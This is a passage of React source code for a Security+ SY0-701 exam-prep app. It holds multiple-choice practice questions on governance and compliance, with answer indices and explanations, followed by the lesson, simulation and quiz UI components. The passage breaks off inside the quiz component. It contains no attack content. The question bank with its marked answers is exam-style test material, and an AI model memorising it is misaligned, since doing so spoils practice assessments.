  { id: 'D5-Q020', domain: 5, question: 'HIPAA protects:', options: ['Financial data', 'Protected Health Information (PHI)', 'Payment card data', 'Intellectual property'], correct: 1, explanation: 'HIPAA protects Protected Health Information (PHI) in healthcare organizations.' },
  { id: 'D5-Q021', domain: 5, question: 'GDPR applies to:', options: ['US companies only', 'Organizations handling EU resident data', 'Healthcare organizations only', 'Financial institutions only'], correct: 1, explanation: 'GDPR applies to any organization processing personal data of EU residents.' },
  { id: 'D5-Q022', domain: 5, question: 'NIST CSF consists of:', options: ['3 functions', '5 functions', '7 functions', '10 functions'], correct: 1, explanation: 'NIST CSF: Identify, Protect, Detect, Respond, Recover (5 functions).' },
  { id: 'D5-Q023', domain: 5, question: 'ISO 27001 is:', options: ['US regulation', 'International security management standard', 'Payment card standard', 'Healthcare regulation'], correct: 1, explanation: 'ISO 27001 is an international standard for information security management systems (ISMS).' },
  { id: 'D5-Q024', domain: 5, question: 'Internal audits are conducted by:', options: ['External parties only', 'The organization itself', 'Regulators only', 'Customers only'], correct: 1, explanation: 'Internal audits are conducted by the organization to identify gaps before external audits.' },
  { id: 'D5-Q025', domain: 5, question: 'External audits provide:', options: ['Internal improvement only', 'Independent verification', 'Faster results', 'Lower costs'], correct: 1, explanation: 'External audits provide independent, objective verification of security and compliance.' },
  { id: 'D5-Q026', domain: 5, question: 'QSA stands for:', options: ['Quality Security Assessment', 'Qualified Security Assessor', 'Quick Security Audit', 'Quarterly Security Analysis'], correct: 1, explanation: 'QSA (Qualified Security Assessor) conducts PCI DSS assessments.' },
  { id: 'D5-Q027', domain: 5, question: 'Security awareness training should be:', options: ['One-time at hire', 'Annual at minimum with ongoing reinforcement', 'Optional for employees', 'Only for IT staff'], correct: 1, explanation: 'Training should be annual minimum with regular reinforcement and role-based content.' },
  { id: 'D5-Q028', domain: 5, question: 'Phishing simulations are used to:', options: ['Punish employees', 'Test and improve security awareness', 'Replace training', 'Identify who to fire'], correct: 1, explanation: 'Phishing simulations test awareness and provide learning opportunities, not punishment.' },
  { id: 'D5-Q029', domain: 5, question: 'Security culture requires:', options: ['Punishment for all mistakes', 'Leadership support and positive reinforcement', 'Technical controls only', 'Annual training only'], correct: 1, explanation: 'Security culture needs leadership support, positive reinforcement, and continuous effort.' },
  { id: 'D5-Q030', domain: 5, question: 'Separation of duties prevents:', options: ['All attacks', 'Single person fraud', 'External threats', 'Technical vulnerabilities'], correct: 1, explanation: 'Separation of duties prevents single individuals from controlling entire critical processes.' },
  { id: 'D5-Q031', domain: 5, question: 'Background checks are part of:', options: ['Technical controls', 'Physical controls', 'Personnel security', 'Network security'], correct: 2, explanation: 'Background checks are personnel security controls performed before granting access.' },
  { id: 'D5-Q032', domain: 5, question: 'NDAs protect:', options: ['Physical assets', 'Confidential information', 'Network infrastructure', 'Building access'], correct: 1, explanation: 'NDAs (Non-Disclosure Agreements) legally protect confidential information.' },
  { id: 'D5-Q033', domain: 5, question: 'Data ownership typically resides with:', options: ['IT department', 'Business/data owners', 'Security team', 'External vendors'], correct: 1, explanation: 'Data ownership typically resides with business units who are accountable for the data.' },
  { id: 'D5-Q034', domain: 5, question: 'Data custodians are responsible for:', options: ['Business decisions about data', 'Technical implementation of data protection', 'Data classification only', 'Deleting all data'], correct: 1, explanation: 'Data custodians (typically IT) implement technical protections as directed by data owners.' },
  { id: 'D5-Q035', domain: 5, question: 'Privacy officers are responsible for:', options: ['Network security', 'Compliance with privacy regulations', 'Physical security', 'Application development'], correct: 1, explanation: 'Privacy officers ensure compliance with privacy laws and manage personal data protection.' },
  { id: 'D5-Q036', domain: 5, question: 'Due diligence in vendor management involves:', options: ['Skipping security reviews', 'Investigating vendor security before contracting', 'Only reviewing pricing', 'Post-incident analysis'], correct: 1, explanation: 'Due diligence investigates vendor security practices before entering contracts.' },
  { id: 'D5-Q037', domain: 5, question: 'Due care means:', options: ['Ignoring security', 'Taking reasonable security precautions', 'Maximum possible security', 'No security investment'], correct: 1, explanation: 'Due care means taking reasonable and appropriate security measures.' },
  { id: 'D5-Q038', domain: 5, question: 'Control frameworks help organizations:', options: ['Avoid all security', 'Implement consistent security controls', 'Eliminate compliance', 'Reduce staff'], correct: 1, explanation: 'Frameworks provide structured approaches for implementing consistent security controls.' },
  { id: 'D5-Q039', domain: 5, question: 'CIS Controls are:', options: ['Legal regulations', 'Prioritized security best practices', 'Insurance requirements', 'Building codes'], correct: 1, explanation: 'CIS Controls are prioritized security best practices for cyber defense.' },
  { id: 'D5-Q040', domain: 5, question: 'Compliance monitoring should be:', options: ['Annual only', 'Continuous', 'Only when problems occur', 'Optional'], correct: 1, explanation: 'Compliance monitoring should be continuous to identify issues promptly.' },
  { id: 'D5-Q041', domain: 5, question: 'Regulatory penalties for non-compliance can include:', options: ['Fines only', 'Fines, sanctions, and business restrictions', 'Verbal warnings only', 'No consequences'], correct: 1, explanation: 'Penalties can include significant fines, sanctions, legal action, and business restrictions.' },
  { id: 'D5-Q042', domain: 5, question: 'Business impact analysis (BIA) identifies:', options: ['Technical vulnerabilities', 'Critical business functions and dependencies', 'User passwords', 'Network topology'], correct: 1, explanation: 'BIA identifies critical business functions, dependencies, and recovery priorities.' },
  { id: 'D5-Q043', domain: 5, question: 'MTD (Maximum Tolerable Downtime) represents:', options: ['Average downtime', 'Longest acceptable outage', 'Shortest possible recovery', 'Network latency'], correct: 1, explanation: 'MTD is the maximum time a business function can be unavailable without unacceptable impact.' },
  { id: 'D5-Q044', domain: 5, question: 'Key Risk Indicators (KRIs) are:', options: ['Metrics predicting potential risk events', 'Only financial metrics', 'Post-incident measurements', 'Compliance requirements'], correct: 0, explanation: 'KRIs are leading indicators that predict potential risk events before they occur.' },
  { id: 'D5-Q045', domain: 5, question: 'Risk register contains:', options: ['User passwords', 'Documented risks and treatment status', 'Network diagrams', 'Employee records'], correct: 1, explanation: 'Risk register documents identified risks, assessments, treatments, and status.' },
  { id: 'D5-Q046', domain: 5, question: 'Vendor termination procedures should include:', options: ['No special actions', 'Data return/destruction and access revocation', 'Automatic renewal', 'Ignoring the vendor'], correct: 1, explanation: 'Termination must include data return/destruction, access revocation, and transition planning.' },
  { id: 'D5-Q047', domain: 5, question: 'Fourth-party risk refers to:', options: ['Quarterly risk reviews', 'Risk from vendors of your vendors', 'Fourth attempt at mitigation', 'Minor risks'], correct: 1, explanation: 'Fourth-party risk comes from your vendors\' vendors (subcontractors) who may access your data.' },
  { id: 'D5-Q048', domain: 5, question: 'Security governance ultimately reports to:', options: ['IT department', 'Board/executive level', 'Individual departments', 'External auditors'], correct: 1, explanation: 'Security governance should have board/executive oversight and accountability.' },
  { id: 'D5-Q049', domain: 5, question: 'Exception management requires:', options: ['No documentation', 'Documentation, approval, compensating controls, and expiration', 'Permanent exceptions', 'No review'], correct: 1, explanation: 'Exceptions need documented justification, approval, compensating controls, and expiration dates.' },
  { id: 'D5-Q050', domain: 5, question: 'Continuous improvement in security programs requires:', options: ['No changes once implemented', 'Regular review and updates based on lessons learned', 'Reducing security over time', 'Ignoring incidents'], correct: 1, explanation: 'Continuous improvement uses lessons learned, metrics, and assessments to enhance security.' }
];


// ═══════════════════════════════════════════════════════════════
// REUSABLE UI COMPONENTS
// ═══════════════════════════════════════════════════════════════
const Card = ({ children, style = {}, className = '' }) => (
  <div className={className} style={{ background: colors.bgSurface, borderRadius: 12, padding: 20, border: `1px solid ${colors.border}`, ...style }}>
    {children}
  </div>
);

const Badge = ({ children, color = colors.accent, style = {} }) => (
  <span style={{ display: 'inline-block', padding: '4px 10px', borderRadius: 20, fontSize: 12, fontWeight: 600, background: `${color}20`, color, ...style }}>
    {children}
  </span>
);

const Button = ({ children, onClick, variant = 'primary', size = 'md', disabled = false, style = {} }) => {
  const baseStyle = { border: 'none', borderRadius: 8, cursor: disabled ? 'not-allowed' : 'pointer', fontWeight: 600, transition: 'all 0.2s', opacity: disabled ? 0.5 : 1 };
  const variants = {
    primary: { background: colors.accent, color: '#fff' },
    secondary: { background: colors.bgElevated, color: colors.textPrimary, border: `1px solid ${colors.border}` },
    success: { background: colors.success, color: '#fff' },
    danger: { background: colors.error, color: '#fff' },
    ghost: { background: 'transparent', color: colors.textSecondary }
  };
  const sizes = { sm: { padding: '6px 12px', fontSize: 13 }, md: { padding: '10px 18px', fontSize: 14 }, lg: { padding: '14px 24px', fontSize: 16 } };
  return <button onClick={disabled ? undefined : onClick} style={{ ...baseStyle, ...variants[variant], ...sizes[size], ...style }}>{children}</button>;
};

const ProgressBar = ({ value, max, color = colors.accent, height = 8 }) => (
  <div style={{ background: colors.bgElevated, borderRadius: height / 2, height, overflow: 'hidden' }}>
    <div style={{ width: `${Math.min((value / max) * 100, 100)}%`, height: '100%', background: color, borderRadius: height / 2, transition: 'width 0.3s ease' }} />
  </div>
);

// ═══════════════════════════════════════════════════════════════
// NAVIGATION BAR
// ═══════════════════════════════════════════════════════════════
const NavBar = ({ view, setView, progress }) => {
  const totalLessons = LESSON_DATA.length;
  const completedLessons = Object.values(progress.lessonProgress || {}).filter(p => p.completed).length;
  const totalSims = SIMULATION_DATA.length;
  const completedSims = Object.values(progress.simProgress || {}).filter(p => p.completed).length;
  
  return (
    <nav style={{ background: colors.bgSurface, borderBottom: `1px solid ${colors.border}`, padding: '12px 24px', position: 'sticky', top: 0, zIndex: 100 }}>
      <div style={{ maxWidth: 1200, margin: '0 auto', display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 12 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12, cursor: 'pointer' }} onClick={() => setView({ type: 'hub' })}>
          <span style={{ fontSize: 24 }}>🛡️</span>
          <div>
            <div style={{ fontWeight: 700, fontSize: 16 }}>Security+ SY0-701</div>
            <div style={{ fontSize: 11, color: colors.textMuted }}>Training Platform v8</div>
          </div>
        </div>
        <div style={{ display: 'flex', gap: 16, fontSize: 13 }}>
          <span style={{ color: colors.textSecondary }}>📚 {completedLessons}/{totalLessons} Lessons</span>
          <span style={{ color: colors.textSecondary }}>🎮 {completedSims}/{totalSims} Simulations</span>
        </div>
        <div style={{ display: 'flex', gap: 8 }}>
          <Button variant="ghost" size="sm" onClick={() => setView({ type: 'hub' })}>Hub</Button>
          <Button variant="ghost" size="sm" onClick={() => setView({ type: 'dashboard' })}>Dashboard</Button>
          <Button variant="ghost" size="sm" onClick={() => setView({ type: 'practice-exam' })}>Practice Exam</Button>
        </div>
      </div>
    </nav>
  );
};

// ═══════════════════════════════════════════════════════════════
// LESSON VIEWER COMPONENT
// ═══════════════════════════════════════════════════════════════
const LessonViewer = ({ lessonId, progress, setProgress, setView }) => {
  const [currentSection, setCurrentSection] = useState(-1); // -1 = intro
  const [showKnowledgeCheck, setShowKnowledgeCheck] = useState(false);
  const [kcAnswer, setKcAnswer] = useState(null);
  const [kcSubmitted, setKcSubmitted] = useState(false);
  
  const lesson = LESSON_DATA.find(l => l.id === lessonId);
  if (!lesson) {
    return (
      <div style={{ padding: 40, textAlign: 'center' }}>
        <h2>Lesson not found</h2>
        <Button onClick={() => setView({ type: 'hub' })}>Back to Hub</Button>
      </div>
    );
  }

  const domain = lesson.domain;
  const color = getDomainColor(domain);
  const sections = lesson.sections || [];
  const totalSections = sections.length;

  const handleComplete = () => {
    const newProgress = { ...progress };
    if (!newProgress.lessonProgress) newProgress.lessonProgress = {};
    newProgress.lessonProgress[lessonId] = { completed: true, completedAt: new Date().toISOString() };
    setProgress(newProgress);
    saveProgress(newProgress);
    setView({ type: 'domain', domain });
  };

  const handleKcSubmit = () => {
    if (kcAnswer === null) return;
    setKcSubmitted(true);
  };

  const handleNextSection = () => {
    setShowKnowledgeCheck(false);
    setKcAnswer(null);
    setKcSubmitted(false);
    if (currentSection < totalSections - 1) {
      setCurrentSection(currentSection + 1);
      window.scrollTo(0, 0);
    }
  };

  const renderIntroduction = () => (
    <div className="slide-up">
      <div style={{ background: `linear-gradient(135deg, ${color}20, ${color}05)`, borderRadius: 12, padding: 24, marginBottom: 24, borderLeft: `4px solid ${color}` }}>
        <Badge color={color}>Domain {domain} • {lesson.difficulty}</Badge>
        <h1 style={{ fontSize: 26, fontWeight: 700, marginTop: 12, marginBottom: 8 }}>{lesson.title}</h1>
        <div style={{ display: 'flex', gap: 16, color: colors.textSecondary, fontSize: 14 }}>
          <span>⏱️ {lesson.duration}</span>
          <span>📖 {totalSections} sections</span>
        </div>
      </div>

      {lesson.introduction?.hook && (
        <Card style={{ marginBottom: 20 }}>
          <h3 style={{ color: color, marginBottom: 12, fontSize: 16 }}>🎯 Why This Matters</h3>
          <p style={{ lineHeight: 1.7, color: colors.textSecondary }}>{lesson.introduction.hook}</p>
        </Card>
      )}

      {lesson.introduction?.learning_goals && (
        <Card style={{ marginBottom: 20 }}>
          <h3 style={{ marginBottom: 12, fontSize: 16 }}>📋 Learning Objectives</h3>
          <ul style={{ margin: 0, paddingLeft: 20 }}>
            {lesson.introduction.learning_goals.map((goal, i) => (
              <li key={i} style={{ marginBottom: 8, color: colors.textSecondary }}>{goal}</li>
            ))}
          </ul>
        </Card>
      )}

      <Button onClick={() => setCurrentSection(0)} size="lg" style={{ width: '100%' }}>
        Begin Lesson →
      </Button>
    </div>
  );

  const renderSection = () => {
    const section = sections[currentSection];
    if (!section) return null;
    
    return (
      <div className="slide-up">
        {/* Progress bar */}
        <div style={{ display: 'flex', gap: 4, marginBottom: 20 }}>
          {sections.map((_, i) => (
            <div key={i} style={{ 
              flex: 1, height: 6, borderRadius: 3, cursor: 'pointer',
              background: i < currentSection ? colors.success : i === currentSection ? color : colors.border
            }} onClick={() => { setCurrentSection(i); setShowKnowledgeCheck(false); setKcAnswer(null); setKcSubmitted(false); }} />
          ))}
        </div>

        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 16 }}>
          <Badge color={color}>Section {currentSection + 1} of {totalSections}</Badge>
          <span style={{ fontSize: 13, color: colors.textMuted }}>{lesson.id}</span>
        </div>

        <Card style={{ marginBottom: 20 }}>
          <h2 style={{ fontSize: 20, fontWeight: 600, marginBottom: 16, color: color }}>{section.title}</h2>
          
          {/* Content rendering */}
          <div style={{ lineHeight: 1.8, color: colors.textSecondary }}>
            {section.content.split('\n\n').map((para, i) => {
              if (para.startsWith('**') && para.endsWith('**')) {
                return <h4 key={i} style={{ color: colors.textPrimary, marginTop: 16, marginBottom: 8, fontWeight: 600 }}>{para.replace(/\*\*/g, '')}</h4>;
              }
              // Handle bold within text
              const parts = para.split(/(\*\*[^*]+\*\*)/g);
              return (
                <p key={i} style={{ marginBottom: 12 }}>
                  {parts.map((part, j) => {
                    if (part.startsWith('**') && part.endsWith('**')) {
                      return <strong key={j} style={{ color: colors.textPrimary }}>{part.replace(/\*\*/g, '')}</strong>;
                    }
                    return part;
                  })}
                </p>
              );
            })}
          </div>

          {/* Key points */}
          {section.key_points && section.key_points.length > 0 && (
            <div style={{ marginTop: 20, padding: 16, background: `${color}10`, borderRadius: 8, borderLeft: `3px solid ${color}` }}>
              <h4 style={{ marginBottom: 8, fontSize: 14, color }}>💡 Key Points</h4>
              <ul style={{ margin: 0, paddingLeft: 16 }}>
                {section.key_points.map((point, i) => (
                  <li key={i} style={{ marginBottom: 4, fontSize: 14 }}>{point}</li>
                ))}
              </ul>
            </div>
          )}

          {/* Exam tips */}
          {section.exam_tips && section.exam_tips.length > 0 && (
            <div style={{ marginTop: 16, padding: 16, background: `${colors.warning}10`, borderRadius: 8, borderLeft: `3px solid ${colors.warning}` }}>
              <h4 style={{ marginBottom: 8, fontSize: 14, color: colors.warning }}>📝 Exam Tips</h4>
              <ul style={{ margin: 0, paddingLeft: 16 }}>
                {section.exam_tips.map((tip, i) => (
                  <li key={i} style={{ marginBottom: 4, fontSize: 14 }}>{tip}</li>
                ))}
              </ul>
            </div>
          )}
        </Card>

        {/* Knowledge Check */}
        {section.knowledge_check && !showKnowledgeCheck && (
          <Button onClick={() => setShowKnowledgeCheck(true)} variant="secondary" style={{ width: '100%', marginBottom: 16 }}>
            📋 Take Knowledge Check
          </Button>
        )}

        {showKnowledgeCheck && section.knowledge_check && (
          <Card style={{ marginBottom: 20, borderLeft: `3px solid ${colors.info}` }}>
            <h4 style={{ marginBottom: 12, color: colors.info }}>📋 Knowledge Check</h4>
            <p style={{ marginBottom: 16, fontWeight: 500 }}>{section.knowledge_check.question}</p>
            
            <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
              {section.knowledge_check.options.map((opt, i) => {
                const isSelected = kcAnswer === i;
                const isCorrect = i === section.knowledge_check.correct;
                let bg = colors.bgElevated, border = colors.border;
                
                if (kcSubmitted) {
                  if (isCorrect) { bg = `${colors.success}20`; border = colors.success; }
                  else if (isSelected) { bg = `${colors.error}20`; border = colors.error; }
                } else if (isSelected) {
                  bg = `${colors.info}20`; border = colors.info;
                }
                
                return (
                  <button key={i} onClick={() => !kcSubmitted && setKcAnswer(i)} disabled={kcSubmitted}
                    style={{ padding: 12, background: bg, border: `2px solid ${border}`, borderRadius: 8, textAlign: 'left', cursor: kcSubmitted ? 'default' : 'pointer', color: colors.textPrimary }}>
                    <span style={{ fontWeight: 600, marginRight: 8 }}>{String.fromCharCode(65 + i)}.</span>
                    {opt}
                    {kcSubmitted && isCorrect && <span style={{ float: 'right', color: colors.success }}>✓</span>}
                    {kcSubmitted && isSelected && !isCorrect && <span style={{ float: 'right', color: colors.error }}>✗</span>}
                  </button>
                );
              })}
            </div>

            {!kcSubmitted ? (
              <Button onClick={handleKcSubmit} disabled={kcAnswer === null} style={{ width: '100%', marginTop: 12 }}>
                Submit Answer
              </Button>
            ) : (
              <div style={{ marginTop: 12, padding: 12, background: kcAnswer === section.knowledge_check.correct ? `${colors.success}15` : `${colors.error}15`, borderRadius: 8 }}>
                <strong style={{ color: kcAnswer === section.knowledge_check.correct ? colors.success : colors.error }}>
                  {kcAnswer === section.knowledge_check.correct ? '✓ Correct!' : '✗ Incorrect'}
                </strong>
                <p style={{ marginTop: 8, fontSize: 14, color: colors.textSecondary }}>{section.knowledge_check.explanation}</p>
              </div>
            )}
          </Card>
        )}

        {/* Summary if last section */}
        {currentSection === totalSections - 1 && lesson.summary && (
          <Card style={{ marginBottom: 20, borderLeft: `3px solid ${colors.success}` }}>
            <h3 style={{ marginBottom: 16, color: colors.success }}>📚 Lesson Summary</h3>
            
            {lesson.summary.key_takeaways && (
              <div style={{ marginBottom: 16 }}>
                <h4 style={{ fontSize: 14, color: colors.textMuted, marginBottom: 8 }}>Key Takeaways</h4>
                <ul style={{ margin: 0, paddingLeft: 20 }}>
                  {lesson.summary.key_takeaways.map((item, i) => (
                    <li key={i} style={{ marginBottom: 4, fontSize: 14, color: colors.textSecondary }}>{item}</li>
                  ))}
                </ul>
              </div>
            )}

            {lesson.summary.exam_essentials && (
              <div style={{ padding: 12, background: `${colors.warning}10`, borderRadius: 8 }}>
                <h4 style={{ fontSize: 14, color: colors.warning, marginBottom: 8 }}>🎯 Exam Essentials</h4>
                <ul style={{ margin: 0, paddingLeft: 20 }}>
                  {lesson.summary.exam_essentials.map((item, i) => (
                    <li key={i} style={{ marginBottom: 4, fontSize: 14, color: colors.textSecondary }}>{item}</li>
                  ))}
                </ul>
              </div>
            )}
          </Card>
        )}

        {/* Navigation */}
        <div style={{ display: 'flex', gap: 12 }}>
          {currentSection > 0 && (
            <Button onClick={() => { setCurrentSection(currentSection - 1); setShowKnowledgeCheck(false); setKcAnswer(null); setKcSubmitted(false); window.scrollTo(0, 0); }} variant="secondary">
              ← Previous
            </Button>
          )}
          {currentSection === 0 && (
            <Button onClick={() => { setCurrentSection(-1); window.scrollTo(0, 0); }} variant="secondary">
              ← Intro
            </Button>
          )}
          <div style={{ flex: 1 }} />
          {currentSection < totalSections - 1 ? (
            <Button onClick={handleNextSection}>Next Section →</Button>
          ) : (
            <Button onClick={handleComplete} variant="success">Complete Lesson ✓</Button>
          )}
        </div>
      </div>
    );
  };

  return (
    <div style={{ padding: 24, maxWidth: 800, margin: '0 auto' }}>
      <button onClick={() => setView({ type: 'domain', domain })} 
        style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
        ← Back to Domain {domain}
      </button>

      {currentSection === -1 ? renderIntroduction() : renderSection()}
    </div>
  );
};


// ═══════════════════════════════════════════════════════════════
// SIMULATION PLAYER COMPONENT
// ═══════════════════════════════════════════════════════════════
const SimulationPlayer = ({ simId, progress, setProgress, setView }) => {
  const [currentDP, setCurrentDP] = useState(0);
  const [score, setScore] = useState(0);
  const [selectedOption, setSelectedOption] = useState(null);
  const [showFeedback, setShowFeedback] = useState(false);
  const [answers, setAnswers] = useState([]);
  const [phase, setPhase] = useState('intro'); // intro, playing, results

  const sim = SIMULATION_DATA.find(s => s.id === simId);
  if (!sim) {
    return (
      <div style={{ padding: 40, textAlign: 'center' }}>
        <h2>Simulation not found</h2>
        <Button onClick={() => setView({ type: 'hub' })}>Back to Hub</Button>
      </div>
    );
  }

  const domain = sim.domain;
  const color = getDomainColor(domain);
  const dps = sim.decision_points || [];
  const totalDPs = dps.length;
  const dp = dps[currentDP];
  const maxScore = dps.reduce((sum, d) => sum + Math.max(...(d.options || []).map(o => o.points || 0)), 0);
  const passingScore = sim.passing_score || Math.floor(maxScore * 0.6);

  const handleOptionSelect = (optionId) => {
    if (showFeedback) return;
    setSelectedOption(optionId);
  };

  const handleSubmit = () => {
    if (!selectedOption || showFeedback) return;
    const option = dp.options.find(o => o.id === selectedOption);
    const points = option?.points || 0;
    setScore(prev => prev + points);
    setAnswers(prev => [...prev, { dp: dp.id, selected: selectedOption, points, optimal: option?.isOptimal || option?.is_correct }]);
    setShowFeedback(true);
  };

  const handleNext = () => {
    if (currentDP < totalDPs - 1) {
      setCurrentDP(prev => prev + 1);
      setSelectedOption(null);
      setShowFeedback(false);
      window.scrollTo(0, 0);
    } else {
      setPhase('results');
    }
  };

  const handleComplete = () => {
    const passed = score >= passingScore;
    const newProgress = { ...progress };
    if (!newProgress.simProgress) newProgress.simProgress = {};
    newProgress.simProgress[simId] = { completed: true, passed, score, maxScore, completedAt: new Date().toISOString() };
    setProgress(newProgress);
    saveProgress(newProgress);
    setView({ type: 'domain', domain });
  };

  const renderIntro = () => (
    <div className="slide-up">
      <div style={{ background: `linear-gradient(135deg, ${color}20, ${color}05)`, borderRadius: 12, padding: 24, marginBottom: 24, borderLeft: `4px solid ${color}` }}>
        <Badge color={color}>Domain {domain} • {sim.type === 'REM' ? 'Remediation' : 'Simulation'}</Badge>
        <h1 style={{ fontSize: 24, fontWeight: 700, marginTop: 12, marginBottom: 8 }}>{sim.title}</h1>
        <div style={{ display: 'flex', gap: 16, color: colors.textSecondary, fontSize: 14, flexWrap: 'wrap' }}>
          <span>⏱️ {sim.time_estimate || '30-45 min'}</span>
          <span>📊 {totalDPs} decisions</span>
          <span>🎯 Pass: {passingScore}+ points</span>
        </div>
      </div>

      {sim.organization && (
        <Card style={{ marginBottom: 20 }}>
          <h3 style={{ marginBottom: 12, fontSize: 16 }}>🏢 Organization</h3>
          <p style={{ color: colors.textSecondary }}><strong>{sim.organization.name}</strong></p>
          <p style={{ color: colors.textMuted, fontSize: 14 }}>{sim.organization.industry}</p>
          {sim.organization.size && <p style={{ color: colors.textMuted, fontSize: 14 }}>{sim.organization.size}</p>}
        </Card>
      )}

      <Card style={{ marginBottom: 20 }}>
        <h3 style={{ marginBottom: 12, fontSize: 16 }}>📋 Scenario</h3>
        <p style={{ lineHeight: 1.7, color: colors.textSecondary }}>{sim.introduction}</p>
      </Card>

      {sim.learning_objectives && (
        <Card style={{ marginBottom: 20 }}>
          <h3 style={{ marginBottom: 12, fontSize: 16 }}>🎯 Objectives</h3>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
            {sim.learning_objectives.map((obj, i) => (
              <Badge key={i} color={color}>{obj}</Badge>
            ))}
          </div>
        </Card>
      )}

      <Button onClick={() => setPhase('playing')} size="lg" style={{ width: '100%' }}>
        Begin Simulation →
      </Button>
    </div>
  );

  const renderDecisionPoint = () => {
    if (!dp) return null;
    
    return (
      <div className="slide-up">
        {/* Progress */}
        <div style={{ marginBottom: 20 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8, fontSize: 13, color: colors.textSecondary }}>
            <span>Decision {currentDP + 1} of {totalDPs}</span>
            <span>Score: {score}</span>
          </div>
          <ProgressBar value={currentDP + 1} max={totalDPs} color={color} />
        </div>

        <Card style={{ marginBottom: 20 }}>
          <Badge color={color} style={{ marginBottom: 12 }}>{dp.title}</Badge>
          
          {dp.situation && (
            <div style={{ marginBottom: 16, padding: 12, background: colors.bgElevated, borderRadius: 8 }}>
              <p style={{ color: colors.textSecondary, fontSize: 14, lineHeight: 1.6 }}>{dp.situation}</p>
            </div>
          )}

          <h3 style={{ marginBottom: 16, fontSize: 16 }}>{dp.question}</h3>

          <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
            {(dp.options || []).map(option => {
              const isSelected = selectedOption === option.id;
              const isOptimal = option.isOptimal || option.is_correct;
              let bg = colors.bgElevated, border = colors.border;
              
              if (showFeedback) {
                if (isOptimal) { bg = `${colors.success}20`; border = colors.success; }
                else if (isSelected) { bg = `${colors.error}20`; border = colors.error; }
              } else if (isSelected) {
                bg = `${color}20`; border = color;
              }

              return (
                <button key={option.id} onClick={() => handleOptionSelect(option.id)}
                  style={{ padding: 14, background: bg, border: `2px solid ${border}`, borderRadius: 8, textAlign: 'left', cursor: showFeedback ? 'default' : 'pointer', color: colors.textPrimary }}>
                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: 10 }}>
                    <span style={{ fontWeight: 600, minWidth: 24 }}>{option.id.toUpperCase()}.</span>
                    <span>{option.text}</span>
                    {showFeedback && isOptimal && <span style={{ marginLeft: 'auto', color: colors.success }}>✓ +{option.points}</span>}
                    {showFeedback && isSelected && !isOptimal && <span style={{ marginLeft: 'auto', color: colors.error }}>+{option.points}</span>}
                  </div>
                </button>
              );
            })}
          </div>
        </Card>

        {showFeedback && (
          <Card style={{ marginBottom: 20, borderLeft: `3px solid ${selectedOption && dp.options.find(o => o.id === selectedOption)?.isOptimal ? colors.success : colors.warning}` }}>
            <h4 style={{ marginBottom: 8 }}>Feedback</h4>
            <p style={{ color: colors.textSecondary, fontSize: 14, lineHeight: 1.6 }}>
              {dp.options.find(o => o.id === selectedOption)?.feedback}
            </p>
            {dp.options.find(o => o.id === selectedOption)?.learningNote && (
              <div style={{ marginTop: 12, padding: 10, background: `${colors.info}10`, borderRadius: 6 }}>
                <p style={{ fontSize: 13, color: colors.info }}>💡 {dp.options.find(o => o.id === selectedOption)?.learningNote}</p>
              </div>
            )}
          </Card>
        )}

        <div style={{ display: 'flex', gap: 12 }}>
          {!showFeedback ? (
            <Button onClick={handleSubmit} disabled={!selectedOption} style={{ flex: 1 }}>Submit Decision</Button>
          ) : (
            <Button onClick={handleNext} style={{ flex: 1 }}>
              {currentDP < totalDPs - 1 ? 'Next Decision →' : 'View Results'}
            </Button>
          )}
        </div>
      </div>
    );
  };

  const renderResults = () => {
    const passed = score >= passingScore;
    const percentage = Math.round((score / maxScore) * 100);
    
    return (
      <div className="slide-up">
        <Card style={{ textAlign: 'center', marginBottom: 24 }}>
          <div style={{ fontSize: 64, marginBottom: 16 }}>{passed ? '🎉' : '📚'}</div>
          <h2 style={{ fontSize: 24, marginBottom: 8, color: passed ? colors.success : colors.warning }}>
            {passed ? 'Simulation Passed!' : 'Keep Learning'}
          </h2>
          <p style={{ color: colors.textSecondary, marginBottom: 24 }}>
            You scored {score} out of {maxScore} points ({percentage}%)
          </p>
          <ProgressBar value={score} max={maxScore} color={passed ? colors.success : colors.warning} height={12} />
          <p style={{ marginTop: 8, fontSize: 13, color: colors.textMuted }}>Passing score: {passingScore}</p>
        </Card>

        <Card style={{ marginBottom: 24 }}>
          <h3 style={{ marginBottom: 16 }}>Decision Summary</h3>
          {answers.map((a, i) => (
            <div key={i} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 0', borderBottom: i < answers.length - 1 ? `1px solid ${colors.border}` : 'none' }}>
              <span style={{ color: colors.textSecondary }}>Decision {i + 1}</span>
              <span style={{ color: a.optimal ? colors.success : colors.warning }}>+{a.points} pts</span>
            </div>
          ))}
        </Card>

        <Button onClick={handleComplete} size="lg" variant={passed ? 'success' : 'primary'} style={{ width: '100%' }}>
          Complete & Return to Domain
        </Button>
      </div>
    );
  };

  return (
    <div style={{ padding: 24, maxWidth: 800, margin: '0 auto' }}>
      <button onClick={() => setView({ type: 'domain', domain })} 
        style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
        ← Back to Domain {domain}
      </button>

      {phase === 'intro' && renderIntro()}
      {phase === 'playing' && renderDecisionPoint()}
      {phase === 'results' && renderResults()}
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════
// QUIZ PLAYER COMPONENT
// ═══════════════════════════════════════════════════════════════
const QuizPlayer = ({ domain, progress, setProgress, setView }) => {
  const [questions, setQuestions] = useState([]);
  const [currentQ, setCurrentQ] = useState(0);
  const [selected, setSelected] = useState(null);
  const [submitted, setSubmitted] = useState(false);
  const [score, setScore] = useState(0);
  const [answers, setAnswers] = useState([]);
  const [phase, setPhase] = useState('intro');

  const color = getDomainColor(domain);
  const domainQuestions = useMemo(() => QUESTIONS.filter(q => q.domain === domain), [domain]);

  const startQuiz = () => {
    const shuffled = shuffleArray(domainQuestions).slice(0, 10);
    setQuestions(shuffled);
    setPhase('playing');
  };

  const handleSubmit = () => {
    if (selected === null) return;
    const q = questions[currentQ];
    const correct = selected === q.correct;
